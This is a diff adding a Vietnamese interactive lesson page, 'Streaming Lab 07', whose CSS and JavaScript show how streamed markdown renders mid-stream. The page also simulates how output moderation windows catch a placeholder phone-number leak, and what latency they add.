@@ -1,0 +1,714 @@
+<!doctype html><html lang="vi"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Streaming Lab 07</title>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Patrick+Hand&family=Be+Vietnam+Pro:wght@400;500;700&family=JetBrains+Mono:wght@500&display=swap">
+<style>
+:root {
+  --bg: #f4f6f7; --panel: #ffffff; --ink: #14202b; --mute: #5a6a77; --line: #d8e0e5;
+  --accent: #0b7a75; --accent-soft: #d6efed; --warn: #b4531a; --bad: #c43b3b; --ok: #1f8a5b;
+  --g1: #2f6fdb; --g2: #c2631a; --g3: #1f8a5b; --g4: #8a4fd6; --dim: #aab6bf;
+  --font: "Be Vietnam Pro", system-ui, sans-serif; --mono: "JetBrains Mono", ui-monospace, monospace;
+}
+@media (prefers-color-scheme: dark) {
+  :root:not([data-theme="light"]) {
+    --bg: #0e1418; --panel: #162028; --ink: #e5edf1; --mute: #92a3af; --line: #2a3a45;
+    --accent: #3cc4bb; --accent-soft: #15383a; --warn: #f0a35e; --bad: #f07575; --ok: #4cc58d;
+    --g1: #6ea0ff; --g2: #f0a35e; --g3: #4cc58d; --g4: #b98af0; --dim: #566874; color-scheme: dark;
+  }
+}
+:root[data-theme="dark"] {
+  --bg: #0e1418; --panel: #162028; --ink: #e5edf1; --mute: #92a3af; --line: #2a3a45;
+  --accent: #3cc4bb; --accent-soft: #15383a; --warn: #f0a35e; --bad: #f07575; --ok: #4cc58d;
+  --g1: #6ea0ff; --g2: #f0a35e; --g3: #4cc58d; --g4: #b98af0; --dim: #566874; color-scheme: dark;
+}
+* { box-sizing: border-box; }
+body { background: var(--bg); color: var(--ink); font: 15px/1.6 var(--font); margin: 0;
+  padding-inline: max(16px, env(safe-area-inset-left, 0px)) max(16px, env(safe-area-inset-right, 0px)); }
+.wrap { max-width: 920px; margin: 0 auto; }
+header.top { padding-block: 36px 12px; }
+header.top h1 { font-size: clamp(1.6rem, 4vw, 2.2rem); margin: 0 0 8px; letter-spacing: -0.01em; text-wrap: balance; }
+header.top p { margin: 0; color: var(--mute); max-width: 62ch; }
+nav.tabs { position: sticky; top: env(safe-area-inset-top, 0px); z-index: 5; background: var(--bg);
+  display: flex; gap: 6px; overflow-x: auto; padding-block: 10px; border-bottom: 1px solid var(--line); }
+nav.tabs a { white-space: nowrap; text-decoration: none; color: var(--mute); font-size: 13px; padding: 6px 12px;
+  border-radius: 999px; border: 1px solid var(--line); background: var(--panel); }
+nav.tabs a:hover, nav.tabs a:focus-visible { color: var(--ink); border-color: var(--accent); outline: none; }
+section.lesson { padding-block: 40px 8px; scroll-margin-top: 56px; }
+.eyebrow { font: 500 12px var(--mono); color: var(--accent); letter-spacing: .06em; text-transform: uppercase; }
+section.lesson h2 { font-size: 1.5rem; margin: 4px 0 6px; text-wrap: balance; }
+.hook { color: var(--mute); margin: 0 0 16px; max-width: 64ch; }
+.stage { background: var(--panel); border: 1px solid var(--line); border-radius: 10px; padding: 16px; min-width: 0; }
+.row { display: flex; flex-wrap: wrap; gap: 8px 12px; align-items: center; margin-bottom: 12px; }
+.hint { color: var(--mute); font-size: 13px; margin: 8px 0 0; }
+.why { display: grid; grid-template-columns: repeat(3, minmax(0, 1fr)); gap: 12px; margin-top: 14px; }
+.why div { border-top: 2px solid var(--line); padding-top: 8px; font-size: 13.5px; min-width: 0; }
+.why b { display: block; font-size: 12px; letter-spacing: .05em; text-transform: uppercase; margin-bottom: 2px; }
+.why .c b { color: var(--ok); } .why .s b { color: var(--mute); } .why .p b { color: var(--warn); }
+.src { font-size: 12.5px; margin-top: 10px; color: var(--mute); }
+button, select { font: inherit; font-size: 13px; color: var(--ink); background: var(--panel); border: 1px solid var(--line);
+  border-radius: 6px; padding: 6px 12px; cursor: pointer; }
+button:hover, select:hover { border-color: var(--accent); }
+button:focus-visible, select:focus-visible, input:focus-visible { outline: 2px solid var(--accent); outline-offset: 2px; }
+button.on { background: var(--accent); border-color: var(--accent); color: #fff; }
+button.primary { background: var(--accent); border-color: var(--accent); color: #fff; }
+label.ctl { display: flex; align-items: center; gap: 8px; font-size: 13px; color: var(--mute); }
+label.ctl output { font: 500 13px var(--mono); color: var(--ink); min-width: 4ch; }
+input[type=range] { accent-color: var(--accent); width: 140px; }
+svg.canvas { width: 100%; height: auto; display: block; touch-action: none; }
+svg text { font: 12px var(--font); fill: var(--ink); }
+svg text.mute { fill: var(--mute); }
+.mono { font-family: var(--mono); }
+.stat { display: flex; flex-wrap: wrap; gap: 8px 20px; font-size: 13px; color: var(--mute); margin-top: 8px; }
+.stat b { font: 500 15px var(--mono); color: var(--ink); }
+.ok { color: var(--ok); } .bad { color: var(--bad); }
+.cols { display: grid; grid-template-columns: repeat(auto-fit, minmax(210px, 1fr)); gap: 14px; }
+.cols h4 { margin: 0 0 6px; font-size: 13px; }
+.cols h4 small { color: var(--mute); font-weight: 400; }
+.rank { position: relative; }
+.rank .it { position: absolute; left: 0; right: 0; display: flex; align-items: center; gap: 6px; padding: 0 10px;
+  border: 1px solid var(--line); border-radius: 6px; background: var(--bg); font-size: 12.5px;
+  transition: transform .55s ease, opacity .4s, background .3s; overflow: hidden; white-space: nowrap; text-overflow: ellipsis; }
+.rank .it.gold { border-color: var(--ok); }
+.rank .it.dim { opacity: .35; }
+.rank .it.hide { opacity: 0; pointer-events: none; }
+.rank .it.hit { background: var(--accent-soft); border-color: var(--accent); }
+.rank .it i { font: 500 11px var(--mono); color: var(--mute); font-style: normal; }
+.rank .it .bar { margin-left: auto; height: 6px; border-radius: 3px; background: var(--accent); flex: none; transition: width .5s; }
+.grid60 { display: grid; grid-template-columns: repeat(20, 1fr); gap: 3px; }
+.grid60 span { aspect-ratio: 1; border-radius: 2px; background: var(--line); transition: background .15s; }
+.grid60 span.pre { background: var(--accent-soft); box-shadow: inset 0 0 0 1px var(--accent); }
+.grid60 span.lit { background: var(--accent); }
+.grid60.slow span.lit { background: var(--warn); }
+.chunks .ch { font-size: 13px; border: 1px solid var(--line); border-radius: 6px; padding: 6px 10px; margin-bottom: 6px; background: var(--bg); }
+.chunks .ch small { font: 500 11px var(--mono); color: var(--mute); display: block; }
+.chunks mark { background: var(--accent-soft); color: var(--ink); border-radius: 3px; padding: 0 1px; }
+.strip { position: relative; height: 54px; background: var(--bg); border: 1px solid var(--line); border-radius: 6px; margin-bottom: 12px; overflow: hidden; }
+.strip .seg { position: absolute; height: 20px; border-radius: 4px; background: var(--g1); opacity: .75; transition: left .4s, width .4s; }
+.strip .band { position: absolute; top: 0; bottom: 0; background: var(--accent-soft); border-inline: 2px solid var(--accent); transition: left .4s, width .4s; }
+.cellbar { display: grid; grid-template-columns: repeat(48, 1fr); gap: 2px; margin: 4px 0 14px; }
+.cellbar span { height: 22px; border-radius: 2px; background: var(--accent); transition: background .3s, opacity .3s; }
+.cellbar span.off { background: var(--line); opacity: .6; }
+.mem { display: grid; grid-template-columns: minmax(110px, 170px) 1fr 70px; gap: 8px; align-items: center; font-size: 12.5px; margin-bottom: 6px; }
+.mem .track { height: 14px; background: var(--bg); border-radius: 3px; overflow: hidden; border: 1px solid var(--line); }
+.mem .fill { height: 100%; background: var(--g1); transition: width .5s; }
+.mem.cur .fill { background: var(--accent); }
+.mem .v { font: 500 12px var(--mono); text-align: right; }
+.legend { display: flex; gap: 14px; flex-wrap: wrap; font-size: 12.5px; color: var(--mute); margin-top: 6px; }
+.legend i { display: inline-block; width: 10px; height: 10px; border-radius: 50%; margin-right: 5px; vertical-align: -1px; }
+.w { transition: transform .8s cubic-bezier(.4,.1,.2,1); cursor: pointer; }
+.w circle { stroke: var(--panel); stroke-width: 2; }
+.w text { font-size: 12px; paint-order: stroke; stroke: var(--panel); stroke-width: 3px; }
+.w.sel circle { stroke: var(--ink); }
+.pulse { animation: pulse .9s ease-out; }
+@keyframes pulse { 0% { opacity: .2; } 100% { opacity: 1; } }
+@media (max-width: 640px) { .why { grid-template-columns: 1fr; } .grid60 { grid-template-columns: repeat(12, 1fr); } }
+@media (prefers-reduced-motion: reduce) { .w, .rank .it, .strip .seg, .strip .band { transition: none; } .pulse { animation: none; } }
+footer.end { padding-block: 40px 56px; color: var(--mute); font-size: 13px; }
+.sum { margin-top: 28px; padding-top: 18px; border-top: 1px solid var(--line); }
+.sum h3 { font-size: 1.05rem; margin: 0 0 10px; }
+.sum h4 { font-size: .9rem; margin: 20px 0 6px; }
+.sum p, .sum li { max-width: 72ch; font-size: 14px; }
+.sum ul, .sum ol { padding-left: 20px; margin: 6px 0; }
+.sum blockquote { margin: 10px 0; padding: 4px 14px; border-left: 3px solid var(--accent); background: var(--accent-soft); border-radius: 0 6px 6px 0; }
+.sum blockquote p { margin: 6px 0; }
+.sum .tbl { overflow-x: auto; margin: 8px 0; }
+.sum table { border-collapse: collapse; font-size: 13px; min-width: 520px; width: 100%; }
+.sum th, .sum td { text-align: left; vertical-align: top; padding: 7px 10px; border: 1px solid var(--line); }
+.sum th { background: var(--bg); font-weight: 700; }
+.sum tr.cur td { background: var(--accent-soft); }
+.sum .verdict { font-size: 13.5px; border: 1px dashed var(--line); border-radius: 6px; padding: 8px 12px; margin: 10px 0; color: var(--mute); }
+.sum .verdict b { color: var(--ink); }
+.sum code { font: 500 12.5px var(--mono); }
+
+.prob { display: grid; gap: 10px; margin: 0 0 16px; padding: 14px 16px; background: var(--panel); border: 1px solid var(--line); border-left: 4px solid var(--accent); border-radius: 8px; }
+.prob .pr { display: grid; grid-template-columns: 150px minmax(0, 1fr); gap: 12px; font-size: 14px; }
+.prob .pr > b { font-size: 12px; letter-spacing: .05em; text-transform: uppercase; color: var(--mute); padding-top: 2px; }
+.prob .ask > div { font-weight: 700; }
+.prob .sol > div { color: var(--ink); }
+.prob ol { margin: 0; padding-left: 18px; }
+.prob li { margin-bottom: 3px; }
+@media (max-width: 640px) { .prob .pr { grid-template-columns: 1fr; gap: 2px; } }
+
+.prob .ex > div { background: var(--accent-soft); border-radius: 6px; padding: 8px 12px; }
+.prob .ex > b { color: var(--accent); }
+
+.terms { margin: 0 0 16px; border: 1px solid var(--line); border-radius: 8px; background: var(--panel); padding: 10px 16px; }
+.terms summary { cursor: pointer; font-size: 12px; font-weight: 700; letter-spacing: .05em; text-transform: uppercase; color: var(--mute); }
+.terms dl { display: grid; grid-template-columns: minmax(120px, 190px) minmax(0, 1fr); gap: 8px 14px; margin: 10px 0 2px; font-size: 13.5px; }
+.terms dt { font-weight: 700; color: var(--accent); }
+.terms dd { margin: 0; }
+@media (max-width: 640px) { .terms dl { grid-template-columns: 1fr; gap: 0; } .terms dd { margin-bottom: 8px; } }
+.topbar { position: sticky; top: env(safe-area-inset-top, 0px); z-index: 6; display: flex; justify-content: space-between; gap: 8px; align-items: center; padding-block: 10px; background: var(--bg); border-bottom: 1px solid var(--line); font-size: 13px; }
+.topbar a { text-decoration: none; color: var(--ink); background: var(--panel); border: 1px solid var(--line); border-radius: 6px; padding: 6px 12px; white-space: nowrap; }
+.topbar a:hover, .topbar a:focus-visible { border-color: var(--accent); outline: none; }
+.topbar .mid { display: flex; gap: 8px; }
+.topbar .off { opacity: .4; pointer-events: none; }
+
+:root { --d-ink: #1f2933; --d-panel: #ffffff; --d-green: #2f9e44; --d-green-soft: #d3f9d8; --d-orange: #e8590c; --d-orange-soft: #fff0e0; --d-blue: #1c7ed6; --d-blue-soft: #d0ebff; --d-purple: #7048e8; --d-purple-soft: #e5dbff; --d-red: #e03131; --d-red-soft: #ffe3e3; --d-pink: #ffc9c9; --d-yellow-soft: #fff3bf; --d-space: #eef0ff; }
+@media (prefers-color-scheme: dark) { :root:not([data-theme="light"]) { --d-ink: #e5edf1; --d-panel: #151e25; --d-green: #51cf66; --d-green-soft: #1b3a26; --d-orange: #ff922b; --d-orange-soft: #3a2a17; --d-blue: #4dabf7; --d-blue-soft: #17324a; --d-purple: #9775fa; --d-purple-soft: #2a2347; --d-red: #ff6b6b; --d-red-soft: #3d1f23; --d-pink: #4a2a2f; --d-yellow-soft: #3d3517; --d-space: #1b2036; } }
+:root[data-theme="dark"] { --d-ink: #e5edf1; --d-panel: #151e25; --d-green: #51cf66; --d-green-soft: #1b3a26; --d-orange: #ff922b; --d-orange-soft: #3a2a17; --d-blue: #4dabf7; --d-blue-soft: #17324a; --d-purple: #9775fa; --d-purple-soft: #2a2347; --d-red: #ff6b6b; --d-red-soft: #3d1f23; --d-pink: #4a2a2f; --d-yellow-soft: #3d3517; --d-space: #1b2036; }
+.wf-t { font-family: "Patrick Hand", "Be Vietnam Pro", sans-serif; fill: var(--d-ink); font-size: 15px; }
+.wf-h { font-size: 21px; } .wf-h2 { font-size: 17px; } .wf-s { font-size: 14px; } .wf-v { font-size: 16px; } .wf-vec { font-size: 13px; }
+.wf-v.green, .wf-vec.green { fill: var(--d-green); } .wf-v.orange, .wf-vec.orange { fill: var(--d-orange); }
+.wf-cap { font-size: 16px; fill: var(--mute); } .wf-q { font-size: 14px; } .wf-a { font-size: 13px; } .wf-ctx { font-size: 12px; } .wf-pdf { font-size: 15px; fill: var(--d-red); } .wf-bn { font-size: 12px; }
+.wf-box { stroke: var(--d-ink); stroke-width: 2.2; }
+.wf-arrow { fill: none; stroke-width: 2.4; stroke-dasharray: 7 6; }
+.wf-badge { fill: var(--d-yellow-soft); stroke: var(--d-orange); stroke-dasharray: 3 2; stroke-width: 1.5; }
+.wf-doc { fill: var(--d-panel); stroke: var(--d-ink); stroke-width: 2.2; } .wf-docl { stroke: var(--d-ink); stroke-width: 2; }
+.wf-tab { stroke: var(--d-ink); stroke-width: 1.6; } .wf-input { fill: var(--d-yellow-soft); stroke: var(--d-ink); stroke-width: 1.6; }
+.wf-node { cursor: pointer; outline: none; }
+.wf-node:hover .wf-box, .wf-node:focus-visible .wf-box, .wf-node.sel .wf-box { stroke: var(--accent); stroke-width: 3.4; }
+.wf-node.glow .wf-box { stroke: var(--d-orange); stroke-width: 4.5; }
+.wf-dot { fill: var(--d-green); stroke: var(--d-ink); stroke-width: 1.2; transition: fill .3s; }
+.wf-dot.cand { fill: var(--d-blue); } .wf-dot.top { stroke: var(--d-green); stroke-width: 3.5; r: 9; }
+.wf-qdot { fill: var(--d-orange); stroke: var(--d-ink); stroke-width: 2; cursor: grab; }
+.wf-ann { fill: none; stroke: var(--d-red); stroke-width: 2.4; stroke-dasharray: 8 6; } .wf-ann-l { fill: var(--d-red); font-size: 15px; }
+.wf-pkt { fill: var(--pkt, var(--d-orange)); stroke: var(--d-ink); stroke-width: 1.5; }
+.wf-caption { min-height: 26px; margin-top: 8px; font-size: 14px; color: var(--mute); }
+
+.deep { margin-top: 28px; padding-top: 18px; border-top: 1px solid var(--line); }
+.deep > h3 { font-size: 1.05rem; margin: 0 0 4px; }
+.qa { border: 1px solid var(--line); border-radius: 8px; background: var(--panel); margin: 8px 0; padding: 0 14px; }
+.qa summary { cursor: pointer; display: flex; gap: 10px; align-items: baseline; padding: 10px 0; font-weight: 700; font-size: 14.5px; list-style: none; }
+.qa summary::-webkit-details-marker { display: none; }
+.qa summary:focus-visible { outline: 2px solid var(--accent); outline-offset: 2px; }
+.qa .qn { font: 500 12px var(--mono); color: var(--accent); flex: none; width: 22px; height: 22px; border-radius: 50%; background: var(--accent-soft); display: inline-grid; place-items: center; }
+.qa[open] summary { border-bottom: 1px dashed var(--line); }
+.qa-a { font-size: 14px; padding: 8px 0 2px; }
+.qa-a p, .qa-a li { max-width: 72ch; }
+.qa-a ul, .qa-a ol { padding-left: 20px; margin: 6px 0; }
+.qa-a code { font: 500 12.5px var(--mono); }
+.qa-a .tbl { overflow-x: auto; margin: 8px 0; }
+.qa-a table, .qa-viz table { border-collapse: collapse; font-size: 13px; width: 100%; }
+.qa-a th, .qa-a td, .qa-viz th, .qa-viz td { text-align: left; vertical-align: top; padding: 6px 9px; border: 1px solid var(--line); }
+.qa-a th, .qa-viz th { background: var(--bg); }
+.qa-viz { margin: 8px 0 12px; padding: 12px; background: var(--bg); border-radius: 8px; border: 1px solid var(--line); min-width: 0; }
+.qa-viz .cap { font-size: 12.5px; color: var(--mute); margin-top: 6px; }
+.qa-take { font-size: 13.5px; border-left: 3px solid var(--accent); background: var(--accent-soft); padding: 6px 10px; border-radius: 0 6px 6px 0; margin: 0 0 14px; }
+
+.poc { margin-top: 28px; padding: 16px; border: 1px solid var(--accent); border-radius: 10px; background: var(--panel); }
+.poc h3 { margin: 0 0 6px; font-size: 1.05rem; }
+.poc p, .poc li { font-size: 14px; max-width: 72ch; }
+.poc-run { display: grid; grid-template-columns: 44px minmax(0, 1fr); gap: 4px 10px; font-size: 13px; color: var(--mute); margin: 8px 0; }
+.poc-run code { font: 500 12.5px var(--mono); color: var(--ink); background: var(--bg); padding: 2px 6px; border-radius: 4px; overflow-wrap: anywhere; }
+.poc-out summary { cursor: pointer; font-size: 13px; font-weight: 700; color: var(--mute); }
+.poc-out pre { overflow-x: auto; background: var(--bg); border: 1px solid var(--line); border-radius: 6px; padding: 10px 12px; font: 12.5px/1.5 var(--mono); margin: 6px 0 10px; }
+.poc ol { padding-left: 20px; margin: 4px 0 0; }
+</style></head><body><div class="wrap">
+<div class="topbar"><a href="index.html">← Danh sách lab</a><div class="mid"><a href="06-errors-cancel.html">← Lab trước</a><a href="08-observability-failures.html">Lab sau →</a></div></div>
+<nav id="tabs" hidden></nav><main id="lessons"></main>
+<footer class="end"><a href="index.html">← Danh sách lab</a> · Nội dung từ docs/streaming/README.md. Dữ liệu trong hình là ví dụ dựng sẵn, không phải kết quả đo.</footer></div><script>
+const SVG_TAGS = ['svg', 'g', 'circle', 'line', 'rect', 'text', 'tspan', 'path', 'polygon', 'defs', 'filter', 'feTurbulence', 'feDisplacementMap', 'marker', 'clipPath', 'title'];
+const lessons = [];
+const lesson = (def) => lessons.push(def);
+
+function el(tag, attrs = {}, kids = []) {
+  const n = SVG_TAGS.includes(tag)
+    ? document.createElementNS('http://www.w3.org/2000/svg', tag)
+    : document.createElement(tag);
+  for (const [k, v] of Object.entries(attrs)) {
+    if (k === 'text') n.textContent = v;
+    else if (k === 'html') n.innerHTML = v;
+    else if (k.startsWith('on')) n.addEventListener(k.slice(2), v);
+    else n.setAttribute(k, v);
+  }
+  for (const c of [].concat(kids)) if (c) n.append(c);
+  return n;
+}
+
+function seeded(seed) {
+  let a = seed;
+  return () => {
+    a |= 0; a = (a + 0x6d2b79f5) | 0;
+    let t = Math.imul(a ^ (a >>> 15), 1 | a);
+    t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t;
+    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
+  };
+}
+
+function slider(label, min, max, step, value, onInput, fmt = (v) => v) {
+  const out = el('output', { text: fmt(value) });
+  const input = el('input', { type: 'range', min, max, step, value });
+  input.addEventListener('input', () => { out.textContent = fmt(+input.value); onInput(+input.value); });
+  const node = el('label', { class: 'ctl' }, [label, input, out]);
+  return { node, input, get: () => +input.value };
+}
+
+function select(label, options, value, onChange) {
+  const s = el('select');
+  options.forEach(([v, t]) => s.append(el('option', { value: v, text: t })));
+  s.value = value;
+  s.addEventListener('change', () => onChange(s.value));
+  return { node: el('label', { class: 'ctl' }, [label, s]), sel: s };
+}
+
+function rankList(rowH) {
+  const box = el('div', { class: 'rank' });
+  const map = new Map();
+  function update(items) {
+    box.style.height = items.length * rowH + 'px';
+    const seen = new Set();
+    items.forEach((it, i) => {
+      seen.add(it.id);
+      let d = map.get(it.id);
+      if (!d) { d = el('div', { class: 'it' }); d.style.height = rowH - 4 + 'px'; box.append(d); map.set(it.id, d); }
+      d.className = 'it ' + (it.cls || '');
+      d.innerHTML = it.html;
+      d.style.transform = `translateY(${i * rowH}px)`;
+    });
+    for (const [id, d] of map) if (!seen.has(id)) d.className = 'it hide';
+  }
+  return { node: box, update };
+}
+
+function fmtNum(n) {
+  if (n >= 1e6) return n / 1e6 + 'M';
+  if (n >= 1e3) return n / 1e3 + 'k';
+  return String(n);
+}
+lesson((() => {
+  const F = '`'.repeat(3), TTFT = 0.8, ITL = 0.02;
+  const MD = ['Dạ, em so sánh nhanh hai mẫu tai nghe cho anh:', '', '| Mẫu | Pin | Chống nước |', '|---|---|---|', '| SV Buds A | 30 giờ | IPX4 |', '| SV Buds Pro | 40 giờ | IPX5 |', '',
+    '**Lưu ý:** cả hai mẫu được đổi trả trong 7 ngày nếu lỗi do nhà sản xuất.', '', 'Mã đổi trả của anh (dán vào mục Đơn hàng):', '', F + 'text', 'DT-2041-SVBUDS', F, '',
+    'Xem thêm [chính sách đổi trả](https://shopviet.vn/doi-tra), hoặc nhắn mã đơn `DH-2041` cho em.'].join('\n');
+  const esc = (s) => String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+  const fx = (v, d = 1) => v.toFixed(d).replace('.', ',');
+  const CAPS = 'font-size:13.5px;line-height:1.55;padding:8px 12px;border:1px solid var(--line);border-radius:6px;margin-top:10px;background:var(--bg)';
+  const CSS = '.mdv p{margin:0 0 8px}.mdv table.mdt{border-collapse:collapse;font-size:13px;margin:0 0 8px}.mdv .mdt th,.mdv .mdt td{border:1px solid var(--line);padding:3px 8px;text-align:left}.mdv pre.mdc{background:var(--bg);border:1px solid var(--line);border-radius:6px;padding:6px 8px;font:12.5px var(--mono);margin:0 0 8px;white-space:pre-wrap}.mdv code{font:12.5px var(--mono);background:var(--bg);padding:0 3px;border-radius:3px}.mdv .mdlink{color:var(--accent);text-decoration:underline}.mdv .mdraw{outline:2px dashed var(--warn);outline-offset:2px}.mdv .mdflip{outline:2px solid var(--bad);outline-offset:2px}.mdv .cursor{display:inline-block;width:7px;height:14px;background:var(--accent);vertical-align:-2px}.mdsrc{font:12px/1.5 var(--mono);white-space:pre-wrap;background:var(--bg);border:1px solid var(--line);border-radius:6px;padding:8px;margin:0;min-height:120px;overflow-wrap:anywhere}';
+
+  const isSep = (l, h) => !!l && /^\|(\s*:?-+:?\s*\|)+$/.test(l.trim()) && l.split('|').length === h.split('|').length;
+  function inline(s) {
+    let h = esc(s).replace(/`([^`\n]+)`/g, '<code>$1</code>').replace(/\*\*([^*\n]+)\*\*/g, '<b>$1</b>')
+      .replace(/\[([^\]\n]+)\]\((https:\/\/[^)\s]+)\)/g, '<span class="mdlink">$1</span>');
+    const vis = h.replace(/<code>[^<]*<\/code>/g, '').replace(/<[^>]+>/g, '');
+    return { h, raw: /\*|`|\[|\]\(/.test(vis) };
+  }
+  function md(src) {
+    const lines = src.split('\n'), out = [];
+    let i = 0;
+    while (i < lines.length) {
+      const ln = lines[i];
+      if (ln.startsWith(F)) {
+        const body = []; i++;
+        while (i < lines.length && !lines[i].startsWith(F)) body.push(lines[i++]);
+        if (i < lines.length) i++;
+        out.push({ t: 'code', h: '<pre class="mdc">' + esc(body.join('\n')) + '</pre>', raw: false });
+        continue;
+      }
+      if (!ln.trim()) { i++; continue; }
+      if (ln.startsWith('|') && isSep(lines[i + 1], ln)) {
+        const rows = [ln]; i += 2;
+        while (i < lines.length && lines[i].startsWith('|')) rows.push(lines[i++]);
+        const cells = (r) => r.trim().replace(/^\|/, '').replace(/\|$/, '').split('|').map((c) => inline(c.trim()).h);
+        out.push({ t: 'table', raw: false, h: '<table class="mdt"><tr>' + cells(rows[0]).map((c) => '<th>' + c + '</th>').join('') + '</tr>' + rows.slice(1).map((r) => '<tr>' + cells(r).map((c) => '<td>' + c + '</td>').join('') + '</tr>').join('') + '</table>' });
+        continue;
+      }
+      const para = [];
+      while (i < lines.length && lines[i].trim() && !lines[i].startsWith(F) && !(lines[i].startsWith('|') && isSep(lines[i + 1], lines[i]))) para.push(lines[i++]);
+      const r = para.map(inline);
+      out.push({ t: 'p', h: '<p>' + r.map((x) => x.h).join('<br>') + '</p>', raw: r.some((x) => x.raw) || para.some((l) => l.startsWith('|')) });
+    }
+    return out;
+  }
+  function patch(src) {
+    const lines = src.split('\n'), fences = lines.filter((l) => l.startsWith(F)).length;
+    let last = lines[lines.length - 1];
+    if (/^`{1,2}$/.test(last)) { lines.pop(); return { text: lines.join('\n'), used: src.length - last.length }; }
+    if (fences % 2) return { text: src + '\n' + F, used: src.length };
+    const end = lines[lines.length - 1] === '' ? lines.length - 1 : lines.length;
+    let j = end;
+    while (j > 0 && lines[j - 1].startsWith('|')) j--;
+    if (j < end && !isSep(lines[j + 1], lines[j])) { const kept = lines.slice(0, j).join('\n'); return { text: kept, used: kept.length }; }
+    const before = last;
+    last = last.replace(/\[([^\]\n]*)\]\([^)]*$/, '$1').replace(/\[([^\]\n]*)$/, '$1');
+    let used = src.length - (before.length - last.length);
+    if (/(^|[^*])\*$/.test(last) && ((last.match(/\*\*/g) || []).length % 2 === 0)) { last = last.slice(0, -1); used--; }
+    if ((last.match(/\*\*/g) || []).length % 2) last += '**';
+    if ((last.match(/`/g) || []).length % 2) last += '`';
+    lines[lines.length - 1] = last;
+    return { text: lines.join('\n'), used };
+  }
+  function closedOnly(src) {
+    const lines = src.split('\n');
+    if (lines.filter((l) => l.startsWith(F)).length % 2) { const cut = src.lastIndexOf('\n' + F) + 1; return { text: src.slice(0, cut), used: cut }; }
+    const cut = Math.max(0, src.lastIndexOf('\n\n'));
+    return { text: src.slice(0, cut), used: cut };
+  }
+  const MODES = { naive: (s) => ({ text: s, used: s.length }), patch, closed: closedOnly };
+  function chunks(src, seed) {
+    const rnd = seeded(seed), out = [];
+    for (let i = 0; i < src.length;) { const n = 2 + Math.floor(rnd() * 6); out.push(src.slice(i, i + n)); i += n; }
+    return out;
+  }
+  const CH = chunks(MD, 7), PREF = CH.map((_, i) => CH.slice(0, i + 1).join(''));
+  function runAll(mode) {
+    let prev = [], flips = 0, rawSteps = 0, hidden = 0;
+    const steps = PREF.map((src) => {
+      const p = MODES[mode](src), b = md(p.text);
+      const flipAt = b.map((x, i) => i < prev.length && prev[i] !== x.t);
+      flips += flipAt.filter(Boolean).length;
+      if (b.some((x) => x.raw)) rawSteps++;
+      hidden += src.length - p.used;
+      prev = b.map((x) => x.t);
+      return { b, flipAt, hidden: src.length - p.used };
+    });
+    return { steps, flips, rawSteps, avgHidden: hidden / PREF.length };
+  }
+
+  const MOD = 'Dạ, đơn DH-2041 của anh đang được giao. Shipper sẽ gọi trước khi tới. Nếu cần đổi địa chỉ, anh nhắn lại mã đơn giúp em. Người nhận trước đó của đơn này dùng số 0123 456 789 nên shipper đã gọi nhầm. Em đã ghi chú giao giờ hành chính. Cảm ơn anh đã mua hàng ở ShopViet.'.split(' ');
+  const PII = /0\d{3} \d{3} \d{3}/, BAD = MOD.map((w, i) => /^\d{3,4}$/.test(w) && i > 30);
+  function windows(kind, W) {
+    const out = [];
+    if (kind === 'sentence') { let s = 0; MOD.forEach((w, i) => { if (/[.?!]$/.test(w) || i === MOD.length - 1) { out.push([s, i]); s = i + 1; } }); return out; }
+    for (let s = 0; s < MOD.length; s += W) out.push([s, Math.min(MOD.length - 1, s + W - 1)]);
+    return out;
+  }
+  function moderate(S) {
+    const g = (j) => TTFT + j * ITL, last = MOD.length - 1, C = S.c / 1000;
+    const tok = MOD.map((w, j) => ({ w, bad: BAD[j], gen: g(j), show: g(j), hide: false, retract: null }));
+    const wins = S.kind === 'none' ? [] : S.kind === 'nostream' ? [[0, last]] : windows(S.kind === 'sentence' ? 'sentence' : 'fixed', Math.max(1, Math.round(S.w)));
+    const flagged = wins.map(([a, b]) => PII.test(MOD.slice(a, b + 1).join(' ')));
+    wins.forEach(([a, b], wi) => {
+      const ready = g(b) + C;
+      for (let j = a; j <= b; j++) {
+        if (S.kind === 'async') { if (flagged[wi]) tok[j].retract = ready; }
+        else { tok[j].show = ready; if (flagged[wi] && (S.kind !== 'nostream' || tok[j].bad)) tok[j].hide = true; }
+      }
+    });
+    const shown = tok.filter((t) => !t.hide), firstShow = Math.min(...shown.map((t) => t.show));
+    const badShown = tok.filter((t) => t.bad && !t.hide), retracted = badShown.length > 0 && badShown.every((t) => t.retract !== null);
+    const firstBad = tok.find((t) => t.bad);
+    const exposure = badShown.length ? (retracted ? Math.max(...badShown.map((t) => t.retract)) - firstBad.show : Infinity) : 0;
+    const goodHidden = tok.filter((t) => !t.bad && (t.hide || t.retract !== null)).length;
+    const parts = wins.map(([a, b]) => MOD.slice(a, b + 1).join(' ')).filter((t) => /\b(0123|456|789)\b/.test(t));
+    return { tok, wins, flagged, firstShow, added: firstShow - TTFT, badShown: badShown.length, retracted, exposure, goodHidden, parts, end: g(last) + C + 0.15, C };
+  }
+
+  return {
+    id: 'ui-moderation', nav: '7. Render & kiểm duyệt', ref: '§3.8–3.9',
+    title: 'Markdown đang stream nhảy loạn vì sao, và chặn nội dung xấu thì khách phải chờ thêm bao lâu',
+    hook: 'Kéo thanh chunk hoặc bấm Chạy để xem markdown được render sau mỗi delta, với ba cách render. Phần dưới: chọn cách kiểm duyệt và độ rộng cửa sổ, xem số điện thoại của khách khác có lọt ra màn hình không.',
+    terms: [
+      ['Delta', 'Một mảnh chữ mới trong stream, thường vài ký tự. Ví dụ "| Mẫ", rồi "u | Pin", rồi " |".'],
+      ['Markdown', 'Cú pháp chữ thường mà model hay trả: **đậm**, bảng bằng dấu |, khối code mở và đóng bằng ba dấu backtick.'],
+      ['Cú pháp chưa đóng', 'Dấu mở đã đến, dấu đóng chưa đến. Ví dụ đã nhận "**Lưu ý" mà chưa nhận "**" thứ hai, nên renderer in nguyên hai dấu sao.'],
+      ['Nhảy layout', 'Một khối đang hiển thị đổi kiểu, ví dụ đoạn chữ "| Mẫu | Pin |" bỗng thành cái bảng, làm mọi thứ bên dưới dịch chuyển.'],
